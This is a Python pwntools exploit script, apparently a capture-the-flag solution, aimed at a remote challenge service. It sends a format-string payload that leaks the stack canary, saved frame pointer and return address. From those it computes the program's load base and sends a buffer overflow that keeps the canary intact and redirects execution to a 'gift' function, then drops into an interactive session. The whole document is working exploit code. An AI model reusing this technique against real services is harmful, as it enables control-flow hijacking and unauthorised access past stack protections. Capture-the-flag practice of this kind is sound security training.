#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

host = 'blitzinstance1.ddns.net'
port = 33457

print("[*] Leaking stack values...")

io = remote(host, port)
io.recvuntil(b'Type in your name below:')
io.sendline(b'%33$llx.%34$llx.%35$llx')

resp = io.recvuntil(b'Give your message of the day?').decode()
leaks = resp.split('Nice to meet you ')[1].split('\n')[0].strip().split('.')

canary = int(leaks[0], 16)
rbp = int(leaks[1], 16)  
ret_addr = int(leaks[2], 16)

print(f"[+] Canary: {hex(canary)}")
print(f"[+] Saved RBP: {hex(rbp)}")
print(f"[+] Return address: {hex(ret_addr)}")

# Calculate PIE base  
base = ret_addr - 0x10c9
gift_addr = base + 0x12a0
ret_gadget = base + 0x10cf  # Simple RET for stack alignment

print(f"[+] PIE base: {hex(base)}")
print(f"[+] Gift address: {hex(gift_addr)}")
print(f"[+] RET gadget: {hex(ret_gadget)}")

# Build payload with RET gadget for stack alignment
payload = b'A' * 104
payload += p64(canary)
payload += p64(0x4141414141414141)  # Dummy RBP
payload += p64(ret_gadget)  # RET gadget for stack alignment  
payload += p64(gift_addr)   # Call gift

print(f"[*] Payload length: {len(payload)}")
print(f"[*] Sending exploit...")

io.sendline(payload)

# Try to interact
io.interactive()